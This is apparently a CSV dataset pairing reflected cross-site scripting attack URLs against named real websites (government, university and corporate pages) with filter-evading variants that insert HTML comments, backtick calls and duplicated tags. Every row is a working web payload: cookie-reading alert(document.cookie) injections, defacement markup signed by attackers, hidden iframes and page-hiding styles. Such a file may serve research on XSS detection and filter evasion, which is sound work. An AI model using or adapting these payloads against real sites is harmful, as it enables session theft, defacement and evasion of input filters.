Payloads,Original
http://mercadolaboral.duoc.cl/alerta.cfm?msg='%22%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e,http://mercadolaboral.duoc.cl/alerta.cfm?msg='%22%3e%3ciframe%20src=http://xssed.com%3e
http://www.soek.se/internetvaerd/hitta.asp?q=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`123`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.soek.se/internetvaerd/hitta.asp?q=%22%3e%3cscript%3ealert(123)%3c/script%3e
http://www.qba.net.au/igal/login.asp?folder=&amp;n=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.qba.net.au/igal/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.sunderland.gov.uk/pages/search/search.asp?action=new+query&amp;searchstring=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`&quot;<br<!--Comment-->><br<!--Comment-->>x&quot;`;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.sunderland.gov.uk/pages/search/search.asp?action=new+query&amp;searchstring=&quot;&gt;&lt;script&gt;alert(&quot;<br>x&quot;);&lt;/script&gt;
http://www.tomshardware.com.tr/community/showflat.m?cat=&amp;board=offtop&amp;number=210397&amp;page=4&amp;view=&quot;&gt;&lt;s<br<!--Comment-->>cript&gt;&lt;<!--Comment-->s<br>cript&gt;alert`'cyber//www.warattack.org'`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,http://www.tomshardware.com.tr/community/showflat.m?cat=&amp;board=offtop&amp;number=210397&amp;page=4&amp;view=&quot;&gt;&lt;s<br>cript&gt;alert('cyber//www.warattack.org')&lt;/script&gt;
http://apps.austria.com/tools/surfandwin/gewinnen/gewinnen.asp?meldung=&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie<br<!--Comment-->><br<!--Comment-->>`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://apps.austria.com/tools/surfandwin/gewinnen/gewinnen.asp?meldung=&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;
http://www.hrb.osr.nsw.gov.au/search/swish?query=x&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`123`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&amp;submit.x=0&amp;submit.y=<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>0&amp;submit=search!,http://www.hrb.osr.nsw.gov.au/search/swish?query=x&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;submit.x=0&amp;submit.y=<br>0&amp;submit=search!
http://www.wwf.no/index.cfm?uglobalsearch=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27xss%27%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;x=0&amp;<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>y=0,http://www.wwf.no/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;x=0&amp;<br>y=0
http://ms156.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22maxwel%22`%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br>pt<!--Comment-->%3e%3c/scri<br>pt<!--Comment-->%3e,http://ms156.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e
http://ofa.fas.harvard.edu/cal/search.php?q=%22%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22xss%20by%20sony<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%22%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22insecurity%20romania%20present%22%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->script<br>%3e%3c<!--Comment-->script<br>%3e%3c<!--Comment-->script<br>%3e%3c<!--Comment-->script<br>%3e%3cscript<br<!--Comment-->>%3e%3cscript<br<!--Comment-->>%3e%3cscript<br<!--Comment-->>%3e%3cscript<br<!--Comment-->>%3ealert%28%22harvard%20arts%22%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3e%3c<!--Comment-->style%3ebody{visibility:hidden;}%20html%20{%20back<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ground-image:%20url%28http://www.lenagold.ru/fon/geom/shar/raz/razshar41.gif%29;%20}%3c/style<!--Comment-->%3e%3c/style<!--Comment-->%3e%3c/style<!--Comment-->%3e%3c/style<!--Comment-->%3e%3c<!--Comment-->/style%3e%3c<!--Comment-->/style%3e%3c<!--Comment-->/style%3e%3c<!--Comment-->/style%3e%27%<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>22%3e%3c<!--Comment-->div%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3c<!--Comment-->div%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3c<!--Comment-->div%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3c<!--Comment-->div%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br<!--Comment-->>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br<!--Comment-->>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br<!--Comment-->>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br<!--Comment-->>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cimg%20src=%22http://i1.giftu<br<!--Comment-->>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3cimg%20src=%22http://i1.giftu<br<!--Comment-->>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3cimg%20src=%22http://i1.giftu<br<!--Comment-->>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3cimg%20src=%22http://i1.giftu<br<!--Comment-->>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3c<!--Comment-->img%20src=%22http://i1.giftu<br>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3c<!--Comment-->img%20src=%22http://i1.giftu<br>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3c<!--Comment-->img%20src=%22http://i1.giftu<br>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3c<!--Comment-->img%20src=%22http://i1.giftu<br>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3c<!--Comment-->br%3e%3c<!--Comment-->br%3e%3c<!--Comment-->br%3e%3c<!--Comment-->br%3e%3cbr<!--Comment-->%3e%3cbr<!--Comment-->%3e%3cbr<!--Comment-->%3e%3cbr<!--Comment-->%3eby%20sony%3ciframe%20src%20=http://www.youtube<br>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\<!--Comment-->%3e%3ciframe%20src%20=http://www.youtube<br>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\<!--Comment-->%3e%3ciframe%20src%20=http://www.youtube<br>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\<!--Comment-->%3e%3ciframe%20src%20=http://www.youtube<br>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\<!--Comment-->%3e%3ciframe%20src%20=http://www.youtube<br<!--Comment-->>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\%3e%3ciframe%20src%20=http://www.youtube<br<!--Comment-->>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\%3e%3ciframe%20src%20=http://www.youtube<br<!--Comment-->>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\%3e%3ciframe%20src%20=http://www.youtube<br<!--Comment-->>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e%3c/div<!--Comment-->%3e&amp;gosearch=go,http://ofa.fas.harvard.edu/cal/search.php?q=%22%3e%3c/title%3e%3cscript%3ealert%28%22xss%20by%20sony<br>%22%29%3c/script%3e%3cscript%3ealert%28%22insecurity%20romania%20present%22%29%3c/script%3e%3cscript<br>%3ealert%28%22harvard%20arts%22%29%3c/script%3e%3cstyle%3ebody{visibility:hidden;}%20html%20{%20back<br>ground-image:%20url%28http://www.lenagold.ru/fon/geom/shar/raz/razshar41.gif%29;%20}%3c/style%3e%27%<br>22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%201<br>0;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e%3cimg%20src=%22http://i1.giftu<br>be.ru/prikoly/prikolnyjj_shhenok_c00b867a3e7a4b1bb1fac14ecc4faec0.gif%22%20style=%22height:%20400px;<br>%20width:%20500px;%22%20alt=%22by%20sony%22%3e%3cbr%3eby%20sony%3ciframe%20src%20=http://www.youtube<br>.com/watch?v=nuxs-9t3tny%22%20width=%220%22%20height=%220%22%20\%3e%3c/div%3e&amp;gosearch=go
http://www.spotpazari.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`&quot;xssedby<br<!--Comment-->><br<!--Comment-->>cicosz&quot;`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://www.spotpazari.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedby<br>cicosz&quot;)&lt;/script&gt;
http://www.kusadasipictures.com/kusadasi-images-now/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<br>/script<!--Comment-->&gt;&lt;<br<!--Comment-->>/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by%20narcoticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;.com,http://www.kusadasipictures.com/kusadasi-images-now/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com
http://www.sat.or.th/ussa/up_pic/folderview.asp?folder=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;ma<br<!--Comment-->>rquee&gt;&lt;ma<br>rquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.sat.or.th/ussa/up_pic/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.artmedic-webdesign.de/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<br<!--Comment-->>h1&gt;&lt;<br>h1<!--Comment-->&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.artmedic-webdesign.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://www.ergoisvicre.com.tr/index.php?a=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;bac<br<!--Comment-->><br<!--Comment-->>kdoor&lt;<!--Comment-->/h1&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.ergoisvicre.com.tr/index.php?a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;
http://mevzuat.basbakanlik.gov.tr/mevzuat/metinx.asp?sourcexmlsearch=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie<br<!--Comment-->><br<!--Comment-->>`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://mevzuat.basbakanlik.gov.tr/mevzuat/metinx.asp?sourcexmlsearch=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;
http://alerts.f-prot.com/cgi-bin/alerts_subscribe.pl?name=xss%20here%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22xss%2<br<!--Comment-->><br<!--Comment-->>2`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cx%20&amp;email=&amp;action=confirm&amp;lang=en&amp;step=step_1&amp;next=step_2&amp;submit=%a0%a0%a0%a0subm<br<!--Comment-->>it%a0%3e%3cx%20&amp;email=&amp;action=confirm&amp;lang=en&amp;step=step_1&amp;next=step_2&amp;submit=%a0%a0%a0%a0subm<br<!--Comment-->>it%a0%3e%3e%a0%a0%a0,http://alerts.f-prot.com/cgi-bin/alerts_subscribe.pl?name=xss%20here%22%3e%3cscript%3ealert(%22xss%2<br>2)%3c/script%3e%3cx%20&amp;email=&amp;action=confirm&amp;lang=en&amp;step=step_1&amp;next=step_2&amp;submit=%a0%a0%a0%a0subm<br>it%a0%3e%3e%a0%a0%a0
http://aps2.toshiba-tro.de/bluetooth/pages/disclaimer.php?dt=bts&amp;download=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>document.cookie%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://aps2.toshiba-tro.de/bluetooth/pages/disclaimer.php?dt=bts&amp;download=%22%3e%3cscript%3ealert%28<br>document.cookie%29%3c/script%3e
